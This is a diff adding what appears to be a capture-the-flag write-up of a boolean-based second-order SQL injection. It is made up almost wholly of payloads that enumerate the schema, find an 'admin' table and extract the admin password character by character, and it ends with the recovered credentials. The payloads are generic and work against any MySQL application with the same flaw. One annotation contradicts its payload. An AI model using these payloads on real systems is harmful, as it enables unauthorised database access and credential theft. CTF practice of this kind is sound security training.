@@ -1,0 +1,71 @@
+Analysis:
+	Boolean-based second order sqli at 'name' set parameter & result at 'score'
+
+
+
+
+
+
+### length(3rd database name)
+' or (SELECT length(schema_name) from information_schema.schemata limit 2,1)='4';-- -
+
+### name of 3rd database
+' or (SELECT schema_name from information_schema.schemata limit 2,1)='quiz'-- -		> TRUE
+
+### length(tables name) in 'quiz' database
+' or (SELECT length(table_name) from information_schema.tables where table_schema='quiz' limit 1)='5';-- -	> TRUE	> 1st table name has length: '5'
+' or (SELECT length(table_name) from information_schema.tables where table_schema='quiz' limit 1,1)='4';-- -	> TRUE	> 2nd table name has length: '4'
+
+### Table name in 'quiz' database
+1st table:
+' or SUBSTRING((SELECT table_name from information_schema.tables where table_schema='quiz' limit 1),1,1)='a';-- -	> 1st char is: 'a'
+' or SUBSTRING((SELECT table_name from information_schema.tables where table_schema='quiz' limit 1),2,1)='d';-- -	> 2nd char is: 'd'
+' or SUBSTRING((SELECT table_name from information_schema.tables where table_schema='quiz' limit 1),3,1)='m';-- -	> 3rd char is: 'm'
+' or SUBSTRING((SELECT table_name from information_schema.tables where table_schema='quiz' limit 1),4,1)='i';-- -	> 4th char is: 'i'
+' or SUBSTRING((SELECT table_name from information_schema.tables where table_schema='quiz' limit 1),5,1)='n';-- -	> 5th char is: 'n'
+Table: 'admin'
+
+
+2nd table:
+' or SUBSTRING((SELECT table_name from information_schema.tables where table_schema='quiz' limit 1,1),1,1)='q';-- -	1st char is: 'q'
+' or SUBSTRING((SELECT table_name from information_schema.tables where table_schema='quiz' limit 1,1),2,1)='u';-- -	2nd char is: 'u'
+' or SUBSTRING((SELECT table_name from information_schema.tables where table_schema='quiz' limit 1,1),2,1)='q';-- -	2nd char is: 'u'
+
+
+### len(column name) in 'admin' table
+1st column:
+' OR (SELECT length(column_name) FROM information_schema.columns WHERE table_name = 'admin' limit 1)='2';-- -		> TRUE > SO, length of 1st column is: '2'
+' OR (SELECT length(column_name) FROM information_schema.columns WHERE table_name = 'admin' limit 1,1)='8';-- -		> TRUE > so, length of 2nd column is: '8'
+' or (SELECT length(column_name) FROM information_schema.columns WHERE table_name = 'admin' limit 2,1)='8';-- -		> TRUE > so, length of 3rd column is: '8'
+
+
+### Identify the column name
+1st column
+' or (SELECT column_name FROM information_schema.columns WHERE table_name = 'admin' limit 1)='id';-- -
+
+2nd column
+' or (SELECT column_name FROM information_schema.columns WHERE table_name = 'admin' limit 1,1)='password';-- -
+
+3rd column
+' or (SELECT column_name FROM information_schema.columns WHERE table_name = 'admin' limit 2,1)='username';-- -
+
+
+
+### len(cell value)
+' or (SELECT length(username) FROM admin limit 1)='5';-- -	> TRUE > so, length of 1st username is: '5'
+
+' or (SELECT length(password) FROM admin limit 1)='17';-- -	> TRUE > so, length of 1st user password is: '17'
+
+
+### Dump the data
+' or (SELECT username FROM admin limit 1)='admin';-- - 		> TRUE > so, username is: 'admin'
+
+admin user's password:
+' or SUBSTRING((SELECT password FROM admin WHERE username='admin' limit 1),1,1)='s';-- -	> TRUE > so, first character is: 's'
+' or SUBSTRING((SELECT password FROM admin WHERE username='admin' limit 1),2,1)='3';-- -	> 2nd character is: '3'
+' or SUBSTRING((SELECT password FROM admin WHERE username='admin' limit 1),3,1)='c';-- -	> 3rd character is: 'c'
+.......
+.......
+
+Password found: S3creT_p4ssw0rd-$
+  Login with the credentials: 'admin:S3creT_p4ssw0rd-$' to access the Flag
